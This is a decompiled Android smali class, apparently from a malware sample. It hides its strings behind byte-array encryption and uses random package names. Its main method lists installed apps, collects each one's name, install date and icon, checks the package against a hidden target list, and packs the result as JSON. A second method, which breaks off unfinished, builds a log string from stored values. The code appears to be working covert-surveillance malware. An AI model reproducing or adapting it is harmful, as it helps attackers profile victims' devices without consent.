.class public abstract Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z4;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field private static a:Ljava/lang/StringBuffer;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 1
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    sput-object v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z4;->a:Ljava/lang/StringBuffer;

    return-void
.end method

.method public static a(Landroid/content/Context;)Ljava/lang/String;
    .locals 16

    .line 1
    :try_start_0
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/16 v2, 0x80

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    const/4 v5, 0x4

    const/16 v6, 0x8

    if-eqz v3, :cond_6

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/content/pm/ApplicationInfo;

    iget-object v7, v3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v1, v7}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v7

    if-eqz v7, :cond_0

    iget-object v7, v3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v1, v7}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v7

    const-string v8, ""

    invoke-virtual {v7, v8}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-nez v7, :cond_0

    new-instance v7, Ljava/util/HashMap;

    invoke-direct {v7}, Ljava/util/HashMap;-><init>()V

    new-array v8, v5, [B

    fill-array-data v8, :array_0

    new-array v9, v6, [B

    fill-array-data v9, :array_1

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-array v8, v5, [B

    fill-array-data v8, :array_2

    new-array v9, v6, [B

    fill-array-data v9, :array_3

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-array v8, v5, [B

    fill-array-data v8, :array_4

    new-array v9, v6, [B

    fill-array-data v9, :array_5

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    iget-object v9, v3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    const/16 v10, 0x1000

    invoke-virtual {v1, v9, v10}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v10

    new-instance v11, Ljava/util/Date;

    iget-wide v12, v10, Landroid/content/pm/PackageInfo;->firstInstallTime:J

    invoke-direct {v11, v12, v13}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v11}, Ljava/util/Date;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v1, v3}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v11

    invoke-interface {v11}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v11
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v12, 0x0

    :try_start_1
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    iget-object v14, v3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v13, v14}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v13

    new-instance v14, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v14}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-static {v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->q(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;

    move-result-object v13

    sget-object v15, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x64

    invoke-virtual {v13, v15, v4, v14}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v14}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v4

    invoke-static {v4, v12}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v8
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    goto/16 :goto_5

    :catch_1
    :goto_1
    if-eqz v8, :cond_1

    :try_start_2
    invoke-virtual {v8}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_2

    :cond_1
    const/16 v4, 0x35

    new-array v4, v4, [B

    fill-array-data v4, :array_6

    new-array v8, v6, [B

    fill-array-data v8, :array_7

    invoke-static {v4, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    :cond_2
    const/4 v4, 0x1

    new-array v13, v4, [B

    const/16 v14, -0x1e

    aput-byte v14, v13, v12

    new-array v14, v6, [B

    fill-array-data v14, :array_8

    invoke-static {v13, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :try_start_3
    sget-object v14, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->d:Ljava/util/ArrayList;

    iget-object v15, v3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v15}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v14

    if-eqz v14, :cond_5

    sget-object v14, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->e:Ljava/util/Map;

    iget-object v3, v3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-interface {v14, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Boolean;

    const/16 v14, -0x58

    if-eqz v3, :cond_4

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-nez v3, :cond_3

    new-array v3, v4, [B

    const/16 v4, 0x6f

    aput-byte v4, v3, v12

    new-array v4, v6, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    :goto_2
    move-object v13, v3

    goto :goto_3

    :cond_3
    new-array v3, v4, [B

    aput-byte v14, v3, v12

    new-array v4, v6, [B

    fill-array-data v4, :array_a

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    goto :goto_2

    :cond_4
    new-array v3, v4, [B

    aput-byte v14, v3, v12

    new-array v4, v6, [B

    fill-array-data v4, :array_b

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    :cond_5
    :goto_3
    :try_start_4
    new-array v3, v5, [B

    fill-array-data v3, :array_c

    new-array v4, v6, [B

    fill-array-data v4, :array_d

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v7, v3, v11}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v3, 0xb

    new-array v4, v3, [B

    fill-array-data v4, :array_e

    new-array v3, v6, [B

    fill-array-data v3, :array_f

    invoke-static {v4, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v7, v3, v10}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-array v3, v5, [B

    fill-array-data v3, :array_10

    new-array v4, v6, [B

    fill-array-data v4, :array_11

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v7, v3, v8}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v3, 0xb

    new-array v3, v3, [B

    fill-array-data v3, :array_12

    new-array v4, v6, [B

    fill-array-data v4, :array_13

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v7, v3, v9}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-array v3, v6, [B

    fill-array-data v3, :array_14

    new-array v4, v6, [B

    fill-array-data v4, :array_15

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v7, v3, v13}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-interface {v0, v7}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto/16 :goto_0

    :cond_6
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_8

    new-instance v1, Lorg/json/JSONArray;

    invoke-direct {v1}, Lorg/json/JSONArray;-><init>()V

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_4
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_7

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/util/Map;

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    new-array v4, v5, [B

    fill-array-data v4, :array_16

    new-array v7, v6, [B

    fill-array-data v7, :array_17

    invoke-static {v4, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v7, v5, [B

    fill-array-data v7, :array_18

    new-array v8, v6, [B

    fill-array-data v8, :array_19

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v2, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v3, v4, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v4, 0xb

    new-array v7, v4, [B

    fill-array-data v7, :array_1a

    new-array v8, v6, [B

    fill-array-data v8, :array_1b

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v4, [B

    fill-array-data v8, :array_1c

    new-array v4, v6, [B

    fill-array-data v4, :array_1d

    invoke-static {v8, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v4}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v7, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v4, v5, [B

    fill-array-data v4, :array_1e

    new-array v7, v6, [B

    fill-array-data v7, :array_1f

    invoke-static {v4, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v7, v5, [B

    fill-array-data v7, :array_20

    new-array v8, v6, [B

    fill-array-data v8, :array_21

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v2, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    invoke-virtual {v3, v4, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v4, 0xb

    new-array v7, v4, [B

    fill-array-data v7, :array_22

    new-array v8, v6, [B

    fill-array-data v8, :array_23

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v4, [B

    fill-array-data v8, :array_24

    new-array v9, v6, [B

    fill-array-data v9, :array_25

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v2, v8}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v3, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v7, v6, [B

    fill-array-data v7, :array_26

    new-array v8, v6, [B

    fill-array-data v8, :array_27

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v6, [B

    fill-array-data v8, :array_28

    new-array v9, v6, [B

    fill-array-data v9, :array_29

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v2, v8}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v3, v7, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v1, v3}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto/16 :goto_4

    :cond_7
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    new-array v2, v5, [B

    fill-array-data v2, :array_2a

    new-array v3, v6, [B

    fill-array-data v3, :array_2b

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    return-object v0

    :goto_5
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_8
    const/4 v0, 0x0

    return-object v0

    nop

    :array_0
    .array-data 1
        -0x6t
        0x36t
        0xat
        0x39t
    .end array-data

    :array_1
    .array-data 1
        -0x6ct
        0x43t
        0x66t
        0x55t
        0x33t
        -0x2dt
        -0x3et
        -0x1et
    .end array-data

    :array_2
    .array-data 1
        0x34t
        0x48t
        -0x3dt
        -0x17t
    .end array-data

    :array_3
    .array-data 1
        0x5at
        0x3dt
        -0x51t
        -0x7bt
        -0x33t
        0x13t
        -0x19t
        -0x30t
    .end array-data

    :array_4
    .array-data 1
        0x5bt
        0x76t
        -0x5ft
        0x61t
    .end array-data

    :array_5
    .array-data 1
        0x35t
        0x3t
        -0x33t
        0xdt
        0xbt
        -0x56t
        0x10t
        0x7t
    .end array-data

    :array_6
    .array-data 1
        0x4et
        -0x4t
        0x36t
        -0x78t
        0x1bt
        -0x31t
        0x33t
        0x26t
        0x4dt
        -0x8t
        0x6dt
        -0x67t
        0x4ft
        -0x3ft
        0x65t
        0x25t
        0x4bt
        -0x12t
        0x27t
        -0x21t
        0x15t
        -0x76t
        0x37t
        0x11t
        0x68t
        -0x2et
        0x10t
        -0x62t
        0x11t
        -0x13t
        0x19t
        0x20t
        0x45t
        -0x24t
        0x3t
        -0x58t
        0x60t
        -0x18t
        0xdt
        0x12t
        0x42t
        -0x28t
        0x17t
        -0x72t
        0x60t
        -0x19t
        0x1ft
        0x6t
        0x7ft
        -0x24t
        0x6ct
        -0x39t
        0xft
    .end array-data

    nop

    :array_7
    .array-data 1
        0x2at
        -0x63t
        0x42t
        -0x17t
        0x21t
        -0x5at
        0x5et
        0x47t
    .end array-data

    :array_8
    .array-data 1
        -0x2et
        0x24t
        0xct
        0x7bt
        0x62t
        0x0t
        -0xet
        -0x74t
    .end array-data

    :array_9
    .array-data 1
        0x5et
        -0x74t
        0x32t
        -0x21t
        -0x24t
        0x53t
        -0xat
        0x39t
    .end array-data

    :array_a
    .array-data 1
        -0x68t
        0x35t
        -0x46t
        0x1bt
        0x7bt
        0x42t
        0x62t
        -0x2dt
    .end array-data

    :array_b
    .array-data 1
        -0x67t
        0x3ft
        0x76t
        -0x35t
        -0x17t
        -0x56t
        -0x1dt
        -0x65t
    .end array-data

    :array_c
    .array-data 1
        -0x21t
        -0x80t
        0x11t
        -0x7ct
    .end array-data

    :array_d
    .array-data 1
        -0x4ft
        -0x1ft
        0x7ct
        -0x1ft
        -0x44t
        -0x40t
        -0x4t
        0x56t
    .end array-data

    :array_e
    .array-data 1
        0x51t
        -0x68t
        0x59t
        -0x4at
        0x20t
        -0x76t
        0xct
        0x5ct
        0x51t
        -0x65t
        0x4ft
    .end array-data

    :array_f
    .array-data 1
        0x38t
        -0xat
        0x2at
        -0x3et
        0x41t
        -0x1at
        0x60t
        0x8t
    .end array-data

    :array_10
    .array-data 1
        -0x7ft
        -0x4dt
        0x42t
        0x52t
    .end array-data

    :array_11
    .array-data 1
        -0x18t
        -0x30t
        0x2dt
        0x3ct
        0x31t
        0xft
        -0x13t
        -0xbt
    .end array-data

    :array_12
    .array-data 1
        0x13t
        -0x2at
        0x2dt
        -0xat
        0x49t
        -0x7et
        0x17t
        -0x79t
        0x2t
        -0x26t
        0x2bt
    .end array-data

    :array_13
    .array-data 1
        0x63t
        -0x49t
        0x4et
        -0x63t
        0x28t
        -0x1bt
        0x72t
        -0x37t
    .end array-data

    :array_14
    .array-data 1
        -0x56t
        -0x74t
        -0x1ct
        0x2dt
        -0x69t
        0x74t
        -0x38t
        0x78t
    .end array-data

    :array_15
    .array-data 1
        -0x3dt
        -0x1t
        -0x72t
        0x48t
        -0xct
        0x0t
        -0x53t
        0x1ct
    .end array-data

    :array_16
    .array-data 1
        0x7et
        0x5bt
        0x3ct
        0x3at
    .end array-data

    :array_17
    .array-data 1
        0x10t
        0x3at
        0x51t
        0x5ft
        0x34t
        0x73t
        0x39t
        -0x12t
    .end array-data

    :array_18
    .array-data 1
        0x8t
        0x7ft
        0x6et
        0x57t
    .end array-data

    :array_19
    .array-data 1
        0x66t
        0x1et
        0x3t
        0x32t
        -0x3ct
        0x21t
        -0x21t
        -0x61t
    .end array-data

    :array_1a
    .array-data 1
        -0x38t
        -0x44t
        0x2ft
        -0x3at
        0x79t
        0x19t
        0x4ft
        -0x6bt
        -0x38t
        -0x41t
        0x39t
    .end array-data

    :array_1b
    .array-data 1
        -0x5ft
        -0x2et
        0x5ct
        -0x4et
        0x18t
        0x75t
        0x23t
        -0x3ft
    .end array-data

    :array_1c
    .array-data 1
        -0x39t
        0x53t
        0x61t
        0x7ct
        -0x27t
        -0x18t
        0x38t
        -0x2et
        -0x39t
        0x50t
        0x77t
    .end array-data

    :array_1d
    .array-data 1
        -0x52t
        0x3dt
        0x12t
        0x8t
        -0x48t
        -0x7ct
        0x54t
        -0x7at
    .end array-data

    :array_1e
    .array-data 1
        -0x4bt
        -0x3bt
        -0x6bt
        -0x3t
    .end array-data

    :array_1f
    .array-data 1
        -0x24t
        -0x5at
        -0x6t
        -0x6dt
        -0xbt
        -0x50t
        0x6at
        0x1bt
    .end array-data

    :array_20
    .array-data 1
        -0x65t
        -0x7at
        -0x62t
        -0x79t
    .end array-data

    :array_21
    .array-data 1
        -0xet
        -0x1bt
        -0xft
        -0x17t
        0x3t
        0x2at
        -0x2at
        -0x3dt
    .end array-data

    :array_22
    .array-data 1
        0x36t
        0x51t
        0x7at
        0x60t
        -0x2et
        0x6ft
        0x6dt
        -0x9t
        0x27t
        0x5dt
        0x7ct
    .end array-data

    :array_23
    .array-data 1
        0x46t
        0x30t
        0x19t
        0xbt
        -0x4dt
        0x8t
        0x8t
        -0x47t
    .end array-data

    :array_24
    .array-data 1
        -0x43t
        -0x66t
        -0x41t
        0x55t
        -0x4ft
        -0x56t
        0x16t
        -0x61t
        -0x54t
        -0x6at
        -0x47t
    .end array-data

    :array_25
    .array-data 1
        -0x33t
        -0x5t
        -0x24t
        0x3et
        -0x30t
        -0x33t
        0x73t
        -0x2ft
    .end array-data

    :array_26
    .array-data 1
        0x12t
        0x7et
        0x0t
        0x7ct
        -0x54t
        -0x18t
        -0x7t
        -0x4t
    .end array-data

    :array_27
    .array-data 1
        0x7bt
        0xdt
        0x6at
        0x19t
        -0x31t
        -0x64t
        -0x64t
        -0x68t
    .end array-data

    :array_28
    .array-data 1
        0x1at
        -0xbt
        -0x1dt
        0x62t
        0x55t
        0x70t
        0x2ft
        0x21t
    .end array-data

    :array_29
    .array-data 1
        0x73t
        -0x7at
        -0x77t
        0x7t
        0x36t
        0x4t
        0x4at
        0x45t
    .end array-data

    :array_2a
    .array-data 1
        -0x59t
        -0x7ft
        0xdt
        0x3bt
    .end array-data

    :array_2b
    .array-data 1
        -0x3at
        -0xft
        0x7dt
        0x48t
        -0x10t
        -0x4at
        0x8t
        -0x43t
    .end array-data
.end method

.method public static b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    .line 1
    const/4 v0, 0x6

    :try_start_0
    new-array v1, v0, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const-string v3, ""

    invoke-static {p0, v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v1, v0, [B

    fill-array-data v1, :array_2

    new-array v4, v2, [B

    fill-array-data v4, :array_3

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 p3, 0x7

    new-array v1, p3, [B

    fill-array-data v1, :array_4

    new-array v4, v2, [B

    fill-array-data v4, :array_5

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array p1, p3, [B

    fill-array-data p1, :array_6

    new-array p3, v2, [B

    fill-array-data p3, :array_7

    invoke-static {p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    new-array p2, v0, [B

    fill-array-data p2, :array_8

    new-array p3, v2, [B

    fill-array-data p3, :array_9

